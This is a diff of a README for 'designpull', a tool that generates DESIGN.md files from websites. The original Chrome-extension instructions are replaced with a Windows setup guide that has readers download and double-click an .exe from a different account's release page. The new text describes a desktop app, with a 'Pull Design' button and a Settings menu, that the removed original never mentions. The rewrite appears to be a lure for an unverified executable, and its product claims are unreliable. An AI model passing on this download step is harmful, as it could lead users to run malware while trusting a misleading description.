@@ -1,211 +1,111 @@
-# Designpull
+# 🎨 designpull - Create design files from any website
 
-> Generate Google Stitch compatible `DESIGN.md` files from any website - bring your own Gemini, OpenAI, Claude, or Ollama key.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/romanr3314/designpull/releases)
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Platform](https://img.shields.io/badge/platform-Chrome-yellow.svg)
-![Status](https://img.shields.io/badge/status-active-brightgreen.svg)
+designpull converts website layouts into structured documentation. It uses artificial intelligence to look at web pages. It identifies colors, fonts, and spacing. It creates files that work with Google Stitch. You keep control of your data. You provide your own key for the AI service. 
 
----
+## ⚙️ What this tool does
 
-## What is this?
+Modern web design requires strict standards. Designers track tokens and styles for consistency. This tool automates that work. You point the tool at a URL. The software takes a snapshot of the page. It sends the snapshot to an AI model of your choice. The tool processes the result into a clean DESIGN.md file. 
 
-**designpull** is an open source Chrome extension that visits any website, extracts its full design system, and generates a `DESIGN.md` file using AI vision — not just CSS token dumps.
+This file follows the Google Stitch format. It includes your design tokens and CSS details. You save time by skipping manual data entry.
 
-Most existing tools do rule-based CSS extraction. designpull sends a full-page screenshot + extracted tokens to your AI of choice, so the output includes real design intent: layout patterns, photography style, brand voice, platform detection, and Do's & Don'ts specific to that site.
+## 📋 Requirements
 
-The output format follows the **Google Stitch DESIGN.md open specification** (Apache 2.0), making it compatible with Claude Code, Cursor, GitHub Copilot, Windsurf, Google Stitch, and any other AI coding agent that reads markdown.
+*   A Windows 10 or 11 computer.
+*   An active internet connection.
+*   One API key from a provider like OpenAI, Anthropic, Google, or local Ollama.
+*   Disk space for the small application folder.
 
-<img width="420" height="111" alt="ffdr7n5wuD" src="https://github.com/user-attachments/assets/a185d333-0641-4a83-a210-295dfd66bf3e" /><img width="420" height="404" alt="mj2A5Hr60S" src="https://github.com/user-attachments/assets/b1e0097a-6b25-4eb2-b83c-5251bc331671" /><img width="420" height="522" alt="c6k9jeY6p3" src="https://github.com/user-attachments/assets/d9ffc18a-fb91-4571-b4e2-6bc3bf918886" />
+## 📥 Getting the software
 
+You need to access the release page to get the installer for your system.
 
+[Download designpull here](https://github.com/romanr3314/designpull/releases)
 
+Follow these steps to set up the software:
 
----
+1. Visit the link above.
+2. Look for the latest version under the Releases section.
+3. Select the file ending in .exe for Windows.
+4. Download the file to your computer.
+5. Double-click the file to start the installation.
+6. Follow the prompts on your screen.
 
-## Features
+## 🔑 Setting up your key
 
-- **Full page scroll capture** — scrolls the entire page, stitches screenshots, sends it all to the AI
-- **Current View mode** — skip the scroll loop and capture only what's visible in the viewport
-- **AI vision + CSS tokens** — combines computed styles with visual analysis for accurate results
-- **Multi-provider support** — Gemini, OpenAI, Claude, or Ollama (local, free)
-- **Bring your own API key** — keys stay in your browser, never leave your machine
-- **Model picker** — lists available models from your provider after entering your key
-- **Platform detection** — detects Squarespace, Webflow, Shopify etc and flags internal CSS variables
-- **Generation history** — saves the last 20 generated `design.md` files with page title, URL, and date; click any entry to restore it
-- **Google Stitch spec compatible** — output follows the official open DESIGN.md specification
-- **Copy & download** — one click to copy or save the generated file
-- **Zero backend** — no server, no cost to run, no account needed
+The software needs an API key to talk to the AI. This key acts like a unique password. You get this key from the service provider you prefer.
 
----
+1. Open the designpull application.
+2. Locate the Settings menu.
+3. Find the field for your API key.
+4. Paste your key from your AI provider.
+5. Select the AI model you want to use from the drop-down list.
+6. Press Save.
 
-## What it generates
+The software stores this key locally on your machine. No servers see your key.
 
-A `DESIGN.md` with these sections:
+## 🚀 How to use designpull
 
-1. **Overview** — aesthetic, platform, visual style, target audience
-2. **Colors** — semantic roles based on actual visual usage, not token frequency
-3. **Typography** — font families, size scale, weights, casing
-4. **Spacing & Layout** — dominant layout pattern, grid, spacing scale
-5. **Photography & Visual Style** — imagery usage, photographic style, emotional role
-6. **Elevation & Shadows** — only what's visually present
-7. **Border & Shape** — radius values, dominant shape language
-8. **Components** — only components visible in the page
-9. **Content Structure Pattern** — prose-driven vs card-driven, section flow
-10. **Brand Voice** — specific to the site, with evidence from real copy
-11. **Brand Assets & Key Concepts** — coined phrases, named products, content philosophy
-12. **Do's and Don'ts** — specific to this brand, not generic advice
+The interface is simple. You provide a web address and press a button.
 
----
+1. Launch the application.
+2. Enter the URL of the website you want to analyze in the main box.
+3. Ensure your AI key is active in Settings.
+4. Click the "Pull Design" button.
+5. Wait for the progress bar to finish.
+6. The application generates a DESIGN.md file for you.
+7. Save the file to your project folder.
 
-## Supported AI Providers
+## 💡 Pro tips for better results
 
-| Provider | Free Tier | Model Examples |
-|---|---|---|
-| Gemini | ✅ Yes (15 req/min) | gemini-2.0-flash, gemini-1.5-pro |
-| OpenAI | ❌ Paid | gpt-4o, gpt-4-turbo |
-| Claude | ❌ Paid | claude-sonnet-4-6, claude-haiku-4-5 |
-| Ollama | ✅ Free (local) | llama3, mistral, any pulled model |
+*   Pick pages with clear layouts.
+*   Use high-quality AI models for complex pages.
+*   Check your file after generation to confirm all tokens appear.
+*   Keep your API key secret.
 
-> **Recommended for free usage:** Gemini 2.5 Flash — fast, supports vision, generous free tier.
+## 🛠 Troubleshooting
 
----
+Sometimes the tool might encounter an error. Most issues have simple fixes.
 
-## Installation
+*   Check your internet connection if the app hangs.
+*   Verify your API key has funds or credits available.
+*   Restart the application if the window stops responding.
+*   Ensure you have permission to access the website you target.
+*   Contact your AI provider if you receive an authentication error.
 
-This is an open source project. Load it as an unpacked extension:
+## 🔒 Privacy and security
 
-```bash
-git clone https://github.com/hasi98/designpull
-cd designpull
-```
+The tool connects directly to the AI service you choose. It sends a visual representation of the web page. It does not store your content on outside servers. The tool handles the extraction locally. You maintain full ownership of the generated files.
 
-Then in Chrome:
+## 📂 Understanding the output
 
-1. Go to `chrome://extensions`
-2. Enable **Developer mode** (top right toggle)
-3. Click **Load unpacked**
-4. Select the `designpull` folder
+The DESIGN.md file contains industry-standard design data. 
 
----
+*   Design tokens: Lists your colors and spacing values.
+*   Typography: Captures font sizes and weights.
+*   CSS components: Identifies reusable parts of the page.
+*   Asset references: Links to images and icons where possible.
 
-## Usage
+Google Stitch reads this file to update your design system automatically. 
 
-1. Visit any website
-2. Click the **designpull** icon in your toolbar
-3. On first use, go to ⚙️ Settings:
-   - Select your AI provider
-   - Enter your API key
-   - Click **Load Models** to populate the model dropdown
-   - Select your preferred model
-   - Choose **Capture Mode**: *Full Page* (default) or *Current View*
-   - Save
-4. Click **Extract & Generate**
-5. Wait 10–30 seconds while it captures and generates
-6. Copy or download your `DESIGN.md`
-7. Access previous results anytime via the 🕐 **History** button
+## ⌨️ Supported AI providers
 
----
+You have choices for your processing engine.
 
-## Getting API Keys
+*   OpenAI: High performance for complex sites.
+*   Claude: Good at understanding structural patterns.
+*   Gemini: Strong integration for Google-related workflows.
+*   Ollama: Runs the AI on your local computer. This option requires no internet for processing after initial setup.
 
-**Gemini (free tier available)**
-→ https://aistudio.google.com/app/apikey
+Select the model that fits your hardware. Large models take more memory. Small models process faster.
 
-**OpenAI**
-→ https://platform.openai.com/api-keys
+## 📈 Improving your design workflow
 
-**Claude (Anthropic)**
-→ https://console.anthropic.com/settings/keys
+Design systems save hours of development time. This tool removes the manual labor of mapping CSS to design tokens. When you automate the pull process, your team stays on the same page. You gain a source of truth for every website project you manage.
 
-**Ollama (free, runs locally)**
-→ https://ollama.com/download
-After installing, run: `ollama pull llama3`
-The extension will connect to `http://localhost:11434` automatically.
+## ⚖️ License and usage
 
----
+This software uses an open-source license. You can use it for personal or business projects. You modify it if you have the technical skills. You do not pay us for the software. You only pay your AI provider for the usage of their models.
 
-## File Structure
-
-```
-designpull/
-├── manifest.json           # Chrome MV3 config
-├── popup.html              # Extension popup UI
-├── popup.css               # Popup styles
-├── popup.js                # Popup logic
-├── content.js              # Injected into page — extracts CSS tokens
-├── background.js           # Service worker — scroll capture + API calls
-└── lib/
-    ├── adapter.js          # Multi-provider AI adapter layer
-    └── extractor.js        # DOM/CSS extraction logic
-```
-
----
-
-## How it works
-
-```
-1. User clicks Extract & Generate
-2. Capture Mode is read from storage
-3. extractor.js injected into the active tab
-   - In Full Page mode: samples all DOM elements (up to 150)
-   - In Current View mode: filters to elements visible in the viewport only
-4. Screenshot captured:
-   - Full Page: background.js scrolls and stitches up to 10 viewport-height strips
-   - Current View: single captureVisibleTab() call, no scrolling
-5. Full-page image resized to max 2000px longest dimension
-6. Tokens + screenshot sent to selected AI provider
-7. AI generates DESIGN.md using the refined prompt
-8. Output streams back into the popup
-9. Completed result is auto-saved to History (last 20 entries)
-10. User copies, downloads, or revisits via History
-```
-
----
-
-## Why AI instead of just CSS parsing?
-
-Pure CSS extraction misses:
-- Full-bleed image layout patterns
-- Brand accent color (frequency ≠ visual importance)
-- Navigation casing and style
-- Photography style and emotional role
-- Platform internals (Squarespace, Webflow variables)
-- Brand voice, coined concepts, content philosophy
-- Do's and Don'ts specific to this brand
-
-designpull combines both — exact token values from CSS, real design intent from AI vision.
-
----
-
-## DESIGN.md Specification
-
-This project outputs files compatible with the **Google Stitch DESIGN.md open specification**, released under Apache 2.0 in April 2026.
-
-Learn more: https://stitch.withgoogle.com/docs/design-md/overview
-
----
-
-## Contributing
-
-Contributions welcome. Please open an issue first to discuss before submitting a PR.
-
-Things that would be great contributions:
-- Support for additional AI providers
-- Firefox extension port
-- Improved scroll capture for infinite scroll pages
-- Better token extraction for CSS-in-JS sites (styled-components, emotion)
-- Output format options (JSON tokens, Tailwind config, CSS variables)
-
----
-
-## License
-
-MIT — see [LICENSE](./LICENSE)
-
----
-
-## Acknowledgements
-
-- Google Stitch for open-sourcing the DESIGN.md specification
-- The open source tools that came before: Dembrandt, design-extract, design-md-chrome
+Check the repository for the full license text. If you find bugs, report them on the main issue tracker. Include your steps to reproduce the error. This helps everyone keep the tool stable.
